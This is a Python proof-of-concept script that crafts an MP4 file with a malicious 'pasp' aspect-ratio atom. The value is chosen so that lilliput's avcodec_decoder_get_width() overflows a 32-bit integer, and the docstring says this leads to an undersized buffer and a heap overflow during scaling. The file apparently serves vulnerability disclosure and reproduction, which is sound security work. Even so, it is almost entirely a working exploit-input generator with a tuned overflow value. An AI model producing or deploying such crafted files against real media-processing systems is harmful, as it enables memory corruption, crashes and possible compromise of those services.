#!/usr/bin/env python3
"""
Reproducer: avcodec SAR integer overflow in lilliput avcodec.cpp

Creates a minimal valid MP4 file with an H.264 stream and a `pasp` atom
whose hSpacing value causes avcodec_decoder_get_width() to overflow:

    return (int64_t)d->codec->width * sar.num / sar.den;
                                       ^^^^^^^^
    The int64_t result is implicitly narrowed to `int`, so a crafted
    sar.num causes the return value to wrap to negative or tiny.

Downstream, the caller allocates an output buffer sized by that dimension
and sws_scale() writes the full decoded frame into the undersized buffer
→ heap buffer overflow.

Requirements:
    ffmpeg (to generate a minimal H.264 stream)

Usage:
    python3 craft_mp4_sar_overflow.py poc_sar_overflow.mp4
    python3 craft_mp4_sar_overflow.py                      # defaults to poc.mp4
"""

import ctypes
import os
import struct
import subprocess
import sys
import tempfile


def simulate_overflow(codec_width, sar_num, sar_den):
    """Simulate the C integer overflow."""
    intermediate_i64 = codec_width * sar_num // sar_den
    result_int = ctypes.c_int32(intermediate_i64).value
    return intermediate_i64, result_int, (intermediate_i64 != result_int)


def find_and_replace_pasp(data, new_sar_num, new_sar_den):
    """Find an existing pasp atom and replace its SAR values."""
    idx = data.find(b'pasp')
    if idx >= 4:
        # pasp atom: [4-byte size][pasp][4-byte hSpacing][4-byte vSpacing]
        before = data[:idx + 4]
        after = data[idx + 12:]  # skip old hSpacing + vSpacing
        return before + struct.pack('>II', new_sar_num, new_sar_den) + after
    return None


def inject_pasp_into_avc1(data, sar_num, sar_den):
    """
    Inject a pasp atom into the avc1 sample entry box.
    
    The pasp atom goes inside the avc1 box (child of stsd), right before
    the avc1 box's end. We find avc1, extend it and its parent boxes by
    the pasp atom size (16 bytes).
    """
    pasp_atom = struct.pack('>I', 16) + b'pasp' + struct.pack('>II', sar_num, sar_den)
    pasp_size = len(pasp_atom)

    # Find avc1 box
    avc1_type_offset = data.find(b'avc1')
    if avc1_type_offset < 4:
        return None
    avc1_offset = avc1_type_offset - 4
    avc1_size = struct.unpack('>I', data[avc1_offset:avc1_offset + 4])[0]
    avc1_end = avc1_offset + avc1_size

    # Insert pasp at end of avc1 (before avc1 closes)
    new_data = bytearray(data[:avc1_end]) + pasp_atom + bytearray(data[avc1_end:])

    # Update avc1 size
    new_avc1_size = avc1_size + pasp_size
    struct.pack_into('>I', new_data, avc1_offset, new_avc1_size)

    # Walk up the container hierarchy and expand parent boxes
    # MP4 structure: ftyp | moov > trak > mdia > minf > stbl > stsd > avc1
    parent_types = [b'stsd', b'stbl', b'minf', b'mdia', b'trak', b'moov']
    for ptype in parent_types:
        type_offset = new_data.find(ptype)
        if type_offset >= 4:
            box_offset = type_offset - 4
            old_size = struct.unpack('>I', new_data[box_offset:box_offset + 4])[0]
            struct.pack_into('>I', new_data, box_offset, old_size + pasp_size)

    return bytes(new_data)


def create_base_mp4(path, width=64, height=64):
    """Use ffmpeg to create a minimal 1-frame MP4 with known dimensions."""
    cmd = [
        'ffmpeg', '-y', '-f', 'lavfi', '-i',
        f'color=c=red:s={width}x{height}:d=0.04:r=25',
        '-c:v', 'libx264', '-profile:v', 'baseline', '-level', '3.0',
        '-pix_fmt', 'yuv420p',
        '-movflags', '+faststart',
        '-an',
        path,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"ffmpeg failed:\n{result.stderr}", file=sys.stderr)
        return False
    return True


def main():
    output_file = sys.argv[1] if len(sys.argv) > 1 else 'poc.mp4'

    codec_width = 64
    # Pick sar_num that overflows when multiplied by codec_width
    # (int64_t)64 * 33554433 = 2,147,483,712 → int32 wraps to -2,147,483,584
    sar_num = 33554433
    sar_den = 1

    i64, i32, overflowed = simulate_overflow(codec_width, sar_num, sar_den)
    assert overflowed, "chosen SAR should overflow"
    assert i32 < 0, "overflow result should be negative"

    print(f"=== Crafting MP4 with SAR overflow ===")
    print(f"  Codec width:     {codec_width}")
    print(f"  SAR:             {sar_num}:{sar_den}")
    print(f"  int64 adjusted:  {i64:,}")
    print(f"  int32 truncated: {i32:,}  ← returned by avcodec_decoder_get_width()")
    print()

    # Step 1: create a base MP4 with ffmpeg
    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as tmp:
        base_path = tmp.name

    print(f"[1/3] Creating base MP4 ({codec_width}x{codec_width}) with ffmpeg...")
    if not create_base_mp4(base_path, width=codec_width, height=codec_width):
        sys.exit(1)

    with open(base_path, 'rb') as f:
        mp4_data = f.read()
    os.unlink(base_path)
    print(f"      Base MP4: {len(mp4_data)} bytes")

    # Step 2: inject pasp atom with overflow SAR
    print(f"[2/3] Injecting pasp atom (SAR {sar_num}:{sar_den})...")
    result = find_and_replace_pasp(mp4_data, sar_num, sar_den)
    if result is None:
        result = inject_pasp_into_avc1(mp4_data, sar_num, sar_den)
    if result is None:
        print("ERROR: Could not find avc1 box to inject pasp", file=sys.stderr)
        sys.exit(1)

    # Step 3: write output
    print(f"[3/3] Writing {output_file}...")
    with open(output_file, 'wb') as f:
        f.write(result)

    print(f"\n[+] Wrote {len(result)} bytes to {output_file}")
    print(f"[+] When lilliput processes this file:")
    print(f"    avcodec_decoder_get_width() returns {i32} (negative!)")
    print(f"    Downstream allocates buffer with that dimension → heap overflow")
    print(f"\n[+] Verify with: ffprobe -show_streams {output_file} | grep -E 'width|sample_aspect'")


if __name__ == '__main__':
    main()
